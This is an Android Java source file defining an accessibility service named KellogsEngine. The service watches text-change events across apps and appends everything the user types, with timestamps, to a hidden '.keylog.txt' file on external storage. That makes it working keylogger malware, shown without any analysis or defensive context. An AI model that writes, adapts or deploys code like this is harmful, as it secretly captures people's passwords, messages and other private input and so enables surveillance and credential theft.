package com.example.olubunmi.kellogs;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.view.accessibility.AccessibilityEvent;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.text.SimpleDateFormat;
import java.util.Date;

public class KellogsEngine extends AccessibilityService {
    String oldKellog = "startingString";
    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        String newKellog = accessibilityEvent.getText().toString();
        if(newKellog.startsWith(oldKellog.substring(0, oldKellog.length()-2))){

        }
        else
        {
            writeToSD(oldKellog);
        }
        oldKellog = newKellog;

}


    @Override
    public void onInterrupt() {

    }
    @Override
    public void onServiceConnected() {
        //configure our Accessibility service
        AccessibilityServiceInfo info = getServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
        info.notificationTimeout = 100;
        this.setServiceInfo(info);
    }
    public void writeToSD(String incoming){
        String FILENAME = ".keylog.txt";
        FileWriter writer;
        try {
            File keylog = new File(Environment.getExternalStorageDirectory(), FILENAME);
            writer = new FileWriter(keylog, true);
            writer.write("\n");
            writer.append(getCurrentTimeStamp());
            writer.append("\t");
            incoming = incoming.replaceAll("\\n", "  ");
            writer.append(incoming);
            writer.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public String getCurrentTimeStamp(){
        try {
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            String currentDateTime = dateFormat.format(new Date());
            return currentDateTime;
        } catch (Exception e){
            return "TimeStampError";
        }

    }
}
